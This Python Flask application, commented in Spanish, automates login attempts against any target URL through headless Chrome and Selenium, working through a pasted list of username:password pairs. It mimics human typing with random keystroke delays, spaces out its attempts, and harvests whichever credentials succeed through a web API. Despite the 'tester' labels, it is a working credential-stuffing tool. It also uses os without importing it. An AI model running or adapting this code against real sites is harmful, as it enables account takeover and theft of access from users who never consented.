from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException
import time
import random
from datetime import datetime
import threading

app = Flask(__name__, static_folder='.')
CORS(app)

# Estado global
test_state = {
    'running': False,
    'progress': 0,
    'total': 0,
    'current': '',
    'logs': [],
    'results': {'success': 0, 'failed': 0, 'valid_credentials': []}
}

def add_log(message, log_type='info'):
    timestamp = datetime.now().strftime("%H:%M:%S")
    test_state['logs'].append({'time': timestamp, 'message': message, 'type': log_type})
    if len(test_state['logs']) > 100:
        test_state['logs'].pop(0)

class SeleniumTester:
    def __init__(self, target_url, headless=True):
        self.driver = None
        self.target_url = target_url
        self.headless = headless
        
    def setup_driver(self):
        add_log("Iniciando navegador...", "info")
        options = Options()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        
        try:
            self.driver = webdriver.Chrome(options=options)
            self.driver.set_page_load_timeout(60)
            add_log("✓ Navegador iniciado", "success")
            return True
        except Exception as e:
            add_log(f"✗ Error: {str(e)}", "error")
            return False
    
    def find_login_fields(self):
        add_log("Buscando campos...", "info")
        time.sleep(3)
        
        try:
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible = [i for i in inputs if i.is_displayed() and i.get_attribute("type") not in ['hidden', 'submit']]
            
            username_field = None
            password_field = None
            
            for inp in visible:
                inp_type = inp.get_attribute("type") or "text"
                if inp_type == "password":
                    password_field = inp
                elif inp_type in ["text", "email"] and not username_field:
                    username_field = inp
            
            if username_field and password_field:
                add_log("✓ Campos encontrados", "success")
                return username_field, password_field
            
            add_log("✗ No se encontraron campos", "error")
            return None, None
            
        except Exception as e:
            add_log(f"Error: {str(e)}", "error")
            return None, None
    
    def fill_and_submit(self, username_field, password_field, username, password):
        try:
            username_field.clear()
            time.sleep(0.5)
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            time.sleep(1)
            
            password_field.clear()
            time.sleep(0.5)
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            time.sleep(1)
            
            # Buscar botón submit
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                if btn.get_attribute("type") == "submit" or "login" in btn.text.lower():
                    btn.click()
                    add_log("✓ Click en botón login", "info")
                    return True
            
            # Fallback: enter en password
            password_field.send_keys("\n")
            return True
            
        except Exception as e:
            add_log(f"Error llenando: {str(e)}", "error")
            return False
    
    def check_success(self):
        time.sleep(5)
        
        page_source = self.driver.page_source.lower()
        
        # Verificar errores
        error_keywords = ['incorrecto', 'inválido', 'error', 'failed', 'wrong']
        for keyword in error_keywords:
            if keyword in page_source:
                return False
        
        # Verificar éxito
        success_keywords = ['dashboard', 'welcome', 'logout', 'perfil', 'bienvenido']
        success_count = sum(1 for k in success_keywords if k in page_source)
        
        return success_count >= 2
    
    def test_credential(self, username, password):
        try:
            add_log(f"Probando: {username}", "info")
            
            self.driver.get(self.target_url)
            time.sleep(2)
            
            user_field, pass_field = self.find_login_fields()
            if not user_field or not pass_field:
                return False
            
            if not self.fill_and_submit(user_field, pass_field, username, password):
                return False
            
            if self.check_success():
                add_log(f"✓ VÁLIDA: {username}:{password}", "success")
                return True
            else:
                add_log(f"✗ Fallida: {username}", "error")
                return False
                
        except Exception as e:
            add_log(f"Error: {str(e)}", "error")
            return False
    
    def cleanup(self):
        if self.driver:
            self.driver.quit()

def run_test_thread(target_url, credentials):
    """Ejecuta el test en background"""
    test_state['running'] = True
    test_state['progress'] = 0
    test_state['total'] = len(credentials)
    test_state['logs'] = []
    test_state['results'] = {'success': 0, 'failed': 0, 'valid_credentials': []}
    
    tester = SeleniumTester(target_url, headless=True)
    
    if not tester.setup_driver():
        test_state['running'] = False
        return
    
    try:
        for i, (username, password) in enumerate(credentials):
            if not test_state['running']:
                break
            
            test_state['current'] = f"{username}:****"
            test_state['progress'] = i + 1
            
            if tester.test_credential(username, password):
                test_state['results']['success'] += 1
                test_state['results']['valid_credentials'].append({
                    'username': username,
                    'password': password
                })
            else:
                test_state['results']['failed'] += 1
            
            time.sleep(random.uniform(2, 4))
            
    finally:
        tester.cleanup()
        test_state['running'] = False
        add_log("Test finalizado", "info")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/start', methods=['POST'])
def start_test():
    if test_state['running']:
        return jsonify({'error': 'Test ya está corriendo'}), 400
    
    data = request.json
    target_url = data.get('target_url')
    credentials_text = data.get('credentials', '')
    
    if not target_url:
        return jsonify({'error': 'URL requerida'}), 400
    
    # Parsear credenciales
    credentials = []
    for line in credentials_text.strip().split('\n'):
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                credentials.append((parts[0].strip(), parts[1].strip()))
    
    if not credentials:
        return jsonify({'error': 'No hay credenciales válidas'}), 400
    
    # Iniciar en thread
    thread = threading.Thread(target=run_test_thread, args=(target_url, credentials))
    thread.daemon = True
    thread.start()
    
    return jsonify({'message': 'Test iniciado', 'total': len(credentials)})

@app.route('/api/stop', methods=['POST'])
def stop_test():
    test_state['running'] = False
    return jsonify({'message': 'Test detenido'})

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify(test_state)

@app.route('/api/clear', methods=['POST'])
def clear_logs():
    test_state['logs'] = []
    test_state['results'] = {'success': 0, 'failed': 0, 'valid_credentials': []}
    return jsonify({'message': 'Logs limpiados'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)